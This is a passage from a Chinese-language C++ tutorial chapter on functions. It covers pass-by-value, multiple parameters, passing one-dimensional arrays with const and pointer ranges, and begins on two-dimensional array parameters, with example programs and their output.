class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用函数，将 value 的值传递给形参 n</span></span><br><span class="line">    modify_value(value);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After calling function: value = &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// value 的值并未改变</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Before calling function: value &#x3D; 10</span><br><span class="line">Inside function (before modification): n &#x3D; 10</span><br><span class="line">Inside function (after modification): n &#x3D; 20</span><br><span class="line">After calling function: value &#x3D; 10</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> <code>main</code> 函数中的变量 <code>value</code> 初始化为 10。</li><li> 调用 <code>modify_value(value)</code> 时，<code>value</code> 的值 (10) 被<strong>复制</strong>给了 <code>modify_value</code> 函数的形参 <code>n</code>。</li><li> 在 <code>modify_value</code> 函数内部，<code>n</code> 的值被修改为 20。但这仅仅修改了 <code>n</code> 这个<strong>局部副本</strong>。</li><li> 当函数执行完毕返回 <code>main</code> 后，<code>main</code> 函数中的原始变量 <code>value</code> 仍然是 10，没有受到函数内部修改的影响。</li></ol><p><strong>优点:</strong></p><ul><li>  <strong>安全性:</strong> 保护了原始数据不被函数意外修改。</li></ul><p><strong>缺点:</strong></p><ul><li>  <strong>效率:</strong> 对于大型数据结构（如复杂的类对象或结构体），复制整个对象可能消耗较多的时间和内存。在这种情况下，后续章节将介绍的按引用传递或按指针传递可能更高效。</li></ul><h3 id="7-2-1-多个参数"><a href="#7-2-1-多个参数" class="headerlink" title="7.2.1 多个参数"></a>7.2.1 多个参数</h3><p>函数可以接受任意数量的参数。在函数定义和原型中，参数之间用逗号 <code>,</code> 分隔。调用函数时，提供的实参也必须用逗号分隔，并且数量、类型和顺序应与形参列表匹配。</p><p><strong>示例：接受多个参数的函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：接受两个 double 和一个 char</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_data</span><span class="params">(<span class="keyword">double</span> length, <span class="keyword">double</span> width, <span class="keyword">char</span> unit)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length: &quot;</span> &lt;&lt; length &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; unit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Width: &quot;</span> &lt;&lt; width &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; unit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Area: &quot;</span> &lt;&lt; length * width &lt;&lt; <span class="string">&quot; sq &quot;</span> &lt;&lt; unit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> len = <span class="number">5.5</span>;</span><br><span class="line">    <span class="keyword">double</span> wid = <span class="number">2.0</span>;</span><br><span class="line">    <span class="keyword">char</span> symbol = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用函数，传递三个实参</span></span><br><span class="line">    display_data(len, wid, symbol);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Length: 5.5 m</span><br><span class="line">Width: 2 m</span><br><span class="line">Area: 11 sq m</span><br></pre></td></tr></table></figure><h3 id="7-2-2-另外一个接受两个参数的函数"><a href="#7-2-2-另外一个接受两个参数的函数" class="headerlink" title="7.2.2 另外一个接受两个参数的函数"></a>7.2.2 另外一个接受两个参数的函数</h3><p>下面是另一个简单的例子，计算并返回两个整数中的较大值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义：接受两个 int 参数，返回较大的那个 int</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a &gt; b) &#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 或者使用三元运算符: return (a &gt; b) ? a : b;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num1 = <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">int</span> num2 = <span class="number">28</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用函数，传递两个实参</span></span><br><span class="line">    <span class="keyword">int</span> larger_value = max(num1, num2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Between &quot;</span> &lt;&lt; num1 &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; num2</span><br><span class="line">              &lt;&lt; <span class="string">&quot;, the larger value is: &quot;</span> &lt;&lt; larger_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 28</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以直接在输出语句中调用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The max of 100 and 99 is: &quot;</span> &lt;&lt; max(<span class="number">100</span>, <span class="number">99</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 100</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子再次展示了如何定义和调用带有多个参数的函数，并且该函数还返回一个值。参数 <code>a</code> 和 <code>b</code> 也是按值传递的。</p><h2 id="7-3-函数和数组"><a href="#7-3-函数和数组" class="headerlink" title="7.3 函数和数组"></a>7.3 函数和数组</h2><p>将数组传递给函数是 C++ 中常见的操作，但其工作方式与传递普通变量（如 <code>int</code> 或 <code>double</code>）有显著不同。理解这种差异对于正确使用数组作为函数参数至关重要。</p><p>与基本类型默认使用“按值传递”（创建副本）不同，当将数组传递给函数时，C++ <strong>不会</strong>复制整个数组。相反，它传递的是数组<strong>第一个元素的内存地址</strong>。这意味着函数实际上接收的是一个指向数组起始位置的指针。</p><h3 id="7-3-1-函数如何使用指针来处理数组"><a href="#7-3-1-函数如何使用指针来处理数组" class="headerlink" title="7.3.1 函数如何使用指针来处理数组"></a>7.3.1 函数如何使用指针来处理数组</h3><p>因为函数接收的是数组的地址（指针），所以它可以通过这个地址直接访问和修改原始数组的内容。这与按值传递完全不同，后者操作的是副本。</p><p>在函数定义中，接收数组参数有几种等效的语法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 语法 1: 使用指针表示法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_array</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> size)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 语法 2: 使用带空括号的数组表示法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_array</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> size)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 语法 3: 使用带指定大小的数组表示法 (大小会被忽略，不推荐)</span></span><br><span class="line"><span class="comment">// void process_array(int arr[10], int size); // 这里的 10 实际上没有作用</span></span><br></pre></td></tr></table></figure><p>这三种语法在函数参数列表中是等效的，它们都告诉编译器 <code>arr</code> 是一个指向 <code>int</code> 的指针。最常用的是语法 1 和语法 2。</p><p><strong>关键点:</strong> 无论使用哪种语法，函数都不知道数组的实际大小。因此，通常需要将数组的大小作为<strong>单独的参数</strong>传递给函数。</p><p><strong>示例：函数修改数组元素</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：接收一个 int 指针 (数组) 和大小</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">double_elements</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> size)</span> </span>&#123; <span class="comment">// 或者 int* arr</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function: Modifying array elements...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        arr[i] *= <span class="number">2</span>; <span class="comment">// 直接修改原始数组的元素</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> my_array[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> array_size = <span class="keyword">sizeof</span>(my_array) / <span class="keyword">sizeof</span>(my_array[<span class="number">0</span>]); <span class="comment">// 计算数组大小</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before calling function: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array_size; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; my_array[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用函数，传递数组名 (即地址) 和大小</span></span><br><span class="line">    double_elements(my_array, array_size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After calling function: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array_size; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; my_array[i] &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 数组内容已被修改</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before calling function: 1 2 3 4 5</span><br><span class="line">Inside function: Modifying array elements...</span><br><span class="line">After calling function: 2 4 6 8 10</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> <code>main</code> 函数定义了一个数组 <code>my_array</code>。</li><li> 调用 <code>double_elements(my_array, array_size)</code> 时，<code>my_array</code> (代表数组首元素的地址) 被传递给函数的 <code>arr</code> 参数，<code>array_size</code> 被传递给 <code>size</code> 参数。</li><li> 函数内部通过指针 <code>arr</code> 访问并修改了 <code>main</code> 函数中定义的 <code>my_array</code> 的元素。</li><li> 函数返回后，<code>main</code> 函数中的 <code>my_array</code> 的内容确实发生了改变。</li></ol><h3 id="7-3-2-将数组作为参数意味着什么"><a href="#7-3-2-将数组作为参数意味着什么" class="headerlink" title="7.3.2 将数组作为参数意味着什么"></a>7.3.2 将数组作为参数意味着什么</h3><p>将数组名传递给函数时，会发生所谓的“数组退化”（Array Decay）。数组名会“退化”成指向其第一个元素的指针。这就是为什么函数参数 <code>int arr[]</code> 和 <code>int* arr</code> 是等价的。</p><p><strong>Implications:</strong></p><ol><li> <strong>效率:</strong> 不需要复制整个数组，传递地址非常快，尤其是对于大数组。</li><li> <strong>修改能力:</strong> 函数可以直接修改调用者提供的原始数组。这既是优点（允许函数“返回”修改后的数组）也是缺点（可能意外修改数据）。</li><li> <strong>丢失大小信息:</strong> 函数本身无法知道数组的大小。必须显式传递大小信息。</li></ol><h3 id="7-3-3-更多数组函数示例"><a href="#7-3-3-更多数组函数示例" class="headerlink" title="7.3.3 更多数组函数示例"></a>7.3.3 更多数组函数示例</h3><p><strong>示例 1: 计算数组元素总和</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：计算数组元素的总和</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_array</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> arr[], <span class="keyword">int</span> size)</span> </span>&#123; <span class="comment">// 使用 const 防止意外修改</span></span><br><span class="line">    <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        total += arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> data[] = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> size = <span class="keyword">sizeof</span>(data) / <span class="keyword">sizeof</span>(data[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">int</span> sum = sum_array(data, size);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of array elements: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 100</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例 2: 查找数组中的最大值</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt; // 为了使用 INT_MIN</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：查找数组中的最大值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_max</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>* arr, <span class="keyword">int</span> size)</span> </span>&#123; <span class="comment">// 使用指针表示法和 const</span></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Array size must be positive.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">std</span>::numeric_limits&lt;<span class="keyword">int</span>&gt;::min(); <span class="comment">// 返回可能的最小值作为错误指示</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max_val = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &gt; max_val) &#123;</span><br><span class="line">            max_val = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> scores[] = &#123;<span class="number">88</span>, <span class="number">95</span>, <span class="number">72</span>, <span class="number">100</span>, <span class="number">91</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="keyword">sizeof</span>(scores) / <span class="keyword">sizeof</span>(scores[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">int</span> highest_score = find_max(scores, count);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Highest score: &quot;</span> &lt;&lt; highest_score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 100</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-3-4-使用数组区间的函数"><a href="#7-3-4-使用数组区间的函数" class="headerlink" title="7.3.4 使用数组区间的函数"></a>7.3.4 使用数组区间的函数</h3><p>除了传递数组首地址和大小之外，另一种常见且更灵活的方法是传递指向数组<strong>开始</strong>和<strong>结束之后</strong>位置的指针（或迭代器，STL 中常用）。这定义了一个处理范围 <code>[begin, end)</code>（包含 begin，不包含 end）。</p><p><strong>示例：使用指针区间求和</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：计算从 begin 到 end (不含 end) 的元素和</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_range</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>* begin, <span class="keyword">const</span> <span class="keyword">int</span>* end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 循环直到当前指针达到 end 指针</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">int</span>* ptr = begin; ptr != end; ++ptr) &#123;</span><br><span class="line">        total += *ptr; <span class="comment">// 解引用指针获取元素值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> data[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> size = <span class="keyword">sizeof</span>(data) / <span class="keyword">sizeof</span>(data[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算整个数组的和</span></span><br><span class="line">    <span class="keyword">int</span> total_sum = sum_range(data, data + size); <span class="comment">// data + size 指向数组末尾之后的位置</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total sum: &quot;</span> &lt;&lt; total_sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 55</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算数组一部分的和 (例如，索引 2 到 6，即元素 3, 4, 5, 6, 7)</span></span><br><span class="line">    <span class="keyword">int</span> partial_sum = sum_range(data + <span class="number">2</span>, data + <span class="number">7</span>); <span class="comment">// data+2 指向第3个元素, data+7 指向第8个元素 (区间终点)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Partial sum (index 2 to 6): &quot;</span> &lt;&lt; partial_sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 25</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方法在 C++ 标准库算法中非常常用。</p><h3 id="7-3-5-指针和-const"><a href="#7-3-5-指针和-const" class="headerlink" title="7.3.5 指针和 const"></a>7.3.5 指针和 const</h3><p>如前面的示例所示，如果函数不应该修改传入的数组，应该在函数参数中使用 <code>const</code> 关键字。这是一种重要的编程实践，可以提高代码的安全性和清晰度。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个函数承诺不会修改 arr 指向的数组内容</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_array</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> arr[], <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Array elements: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        <span class="comment">// arr[i] = 0; // 错误！编译器会阻止修改 const 数据</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>const</code> 有两个主要好处：</p><ol><li> <strong>防止意外修改:</strong> 编译器会检查并阻止函数内部对 <code>const</code> 参数的修改尝试。</li><li> <strong>表明意图:</strong> 向函数的调用者表明该函数不会改变传入的数组，使得函数接口更清晰。</li><li> <strong>接受更广泛的参数:</strong> <code>const</code> 参数的函数可以接受 <code>const</code> 数组和非 <code>const</code> 数组作为实参，而非 <code>const</code> 参数的函数只能接受非 <code>const</code> 数组。</li></ol><p>总结来说，将数组传递给函数是通过传递指向其首元素的指针来实现的。这使得函数能够访问和（如果未使用 <code>const</code>）修改原始数组，但也要求调用者通常需要额外传递数组的大小或使用指针区间来界定操作范围。</p><h2 id="7-4-函数和二维数组"><a href="#7-4-函数和二维数组" class="headerlink" title="7.4 函数和二维数组"></a>7.4 函数和二维数组</h2><p>将二维数组传递给函数比传递一维数组稍微复杂一些。与一维数组类似，二维数组名在传递时也会“退化”成指向其第一个元素的指针。但二维数组的第一个元素本身是一个<strong>一维数组</strong>。因此，传递的是指向一维数组的指针。</p><p>为了让函数能够正确地计算元素在内存中的位置，编译器需要知道除第一维（行数）之外的所有其他维度的大小（列数，以及更高维度的相应大小）。</p><p><strong>关键点:</strong> 在函数参数中声明二维数组时，<strong>必须</strong>指定除第一维之外的所有维度的大小。第一维的大小是可选的（通常省略）。</p><p><strong>语法:</strong></p><p>假设有一个二维数组 <code>int data[3][4];</code></p><p>函数原型或定义可以这样写：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 语法 1: 指定列数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_2d_array</span><span class="params">(<span class="keyword">int</span> arr[][<span class="number">4</span>], <span class="keyword">int</span> rows)</span></span>; <span class="comment">// 必须指定列数 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 语法 2: 使用指向数组的指针 (更精确地反映底层机制)</span></span><br><span class="line"><span class="comment">// arr 是一个指针，指向一个包含 4 个 int 的数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_2d_array</span><span class="params">(<span class="keyword">int</span> (*arr)[<span class="number">4</span>], <span class="keyword">int</span> rows)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 语法 3: 可以包含第一维，但通常省略</span></span><br><span class="line"><span class="comment">// void process_2d_array(int arr[3][4], int rows); // 这里的 3 实际上会被忽略</span></span><br></pre></td></tr></table></figure><p><strong>为什么必须指定列数？</strong></p><p>考虑二维数组 <code>arr[rows][cols]</code> 在内存中是线性存储的。要访问元素 